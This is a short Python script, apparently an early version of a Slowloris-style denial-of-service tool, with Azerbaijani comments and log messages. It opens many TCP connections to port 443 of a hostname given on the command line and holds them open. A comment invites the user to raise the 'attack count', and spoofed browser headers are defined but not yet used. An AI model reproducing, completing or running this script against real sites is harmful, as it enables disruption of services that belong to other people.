import socket
import sys
printLog = 2
def log(text, lvl=1):
    if printLog >= lvl:
        print(text)
socketList = []
HTTPHeaders = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/41.0 Firefox/42.0", # asagida alternativler movcuddur ( 11-ci setir)
    "Accept-language: *" # asagida alternativler movcuddur ( 15-ci setir) 
    ############## User-agent ucun:
    # Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
    # Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0
    # Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41
    ############# Accept-language ucun:
    # fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
    # de
    # de-CH
    # en-US,en;q=0.5
]
hostName = sys.argv[1]
attackCount = 40 # buradan hucum sayini artirin.
log("{} saytina {} eded fake user gonderilir.".format(hostName, attackCount))
for i in range(1,attackCount+1):
    try:
        log("Artiq {} qosulma mumkun oldu".format(i), lvl=2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((hostName, 443))
    except socket.error:
        break
    socketList.append(s)
log("{} saytina ugurla {} eded fake user gonderildi.".format(hostName, i))
